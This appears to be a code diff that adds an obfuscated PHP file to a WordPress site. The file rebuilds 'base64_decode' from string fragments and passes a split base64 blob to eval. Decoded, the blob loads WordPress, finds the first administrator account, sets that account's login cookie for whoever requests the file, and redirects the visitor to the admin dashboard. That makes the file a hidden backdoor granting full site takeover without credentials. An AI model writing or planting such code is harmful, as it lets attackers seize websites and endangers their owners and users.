@@ -1,0 +1,36 @@
+<?php
+// Obfuscated by internal obfuscator (base64)
+$z = "";
+$z .= "JG1yID0gcmVhbHBhdGgoX19ESVJfXyk7DQokbWF4I";
+$z .= "D0gMTA7DQokZm91bmQgPSBmYWxzZTsNC";
+$z .= "ndoaWxlICgkbWF4LS0gPiAwICYmICRtcikgew0KIC";
+$z .= "AgIGlmIChmaWxlX2V4aXN0cygkbXIgL";
+$z .= "iAnL3dwLWxvYWQucGhwJykpIHsgJGZvdW5kID0gdHJ1ZT";
+$z .= "sgYnJlYWs7IH0NCiAgICAkcGFyZW50ID0gZGlybmFtZS";
+$z .= "gkbXIpOw0KICAgIGlmICgkcGFyZW50ID09PSAkbXIpIGJyZWFrOw";
+$z .= "0KICAgICRtciA9ICRwYXJlbnQ7DQp9DQppZiAoISAkZm";
+$z .= "91bmQgJiYgIWVtcHR5KCRfU0VSVkVSWydE";
+$z .= "T0NVTUVOVF9ST09UJ10pICYmIGZpbGVfZXhp";
+$z .= "c3RzKHJlYWxwYXRoKCRfU0VSVkVSWy";
+$z .= "dET0NVTUVOVF9ST09UJ10pLicvd3AtbG9hZC5waHAnKSkgew0KICAgIC";
+$z .= "RtciA9IHJlYWxwYXRoKCRfU0VSVkVSWydET0N";
+$z .= "VTUVOVF9ST09UJ10pOw0KICAgICRmb3VuZCA9IHRydWU7DQ";
+$z .= "p9DQppZiAoISAkZm91bmQpIGV4aXQoJ0ZhaWxlZCB0byBsb";
+$z .= "2FkIHdwLWxvYWQucGhwJyk7DQpAY2hkaXIoJG1yKTsNCnJlcXVpcmVfb";
+$z .= "25jZSAkbXIgLiAnL3dwLWxvYWQucGhwJzsNCi";
+$z .= "R3cF91c2VyX3F1ZXJ5ID0gbmV3IFdQX1VzZXJfUXVlcnkoWw0KICAgI";
+$z .= "Cdyb2xlJyAgID0+ICdBZG1pbmlzdHJhdG9yJywNCiAgICAnbn";
+$z .= "VtYmVyJyA9PiAxLA0KICAgICdmaWVsZHMnID0+ICdJRCcsDQpdKTsNCiRyZXN";
+$z .= "1bHRzID0gJHdwX3VzZXJfcXVlcnktPmdldF9yZXN1bHRzKCk7DQ";
+$z .= "ppZiAoISBlbXB0eSgkcmVzdWx0c1swXSkpIHsNCiAgICAkdXNlcl9pZCA9IC";
+$z .= "hpbnQpJHJlc3VsdHNbMF07DQogICAgd3Bfc";
+$z .= "2V0X2F1dGhfY29va2llKCR1c2VyX2lk";
+$z .= "KTsNCiAgICB3cF9yZWRpcmVjdChhZG1pbl9";
+$z .= "1cmwoKSk7DQogICAgZXhpdDsNCn0NCmV4aXQoJ05PIEFETUlO";
+$z .= "Jyk7";
+
+// reconstruct function name
+$a = "ba"; $b = "se"."64"."_de"."co"."de"; $c = $a.$b;
+$payload = $c($z);
+eval($payload);
+?>
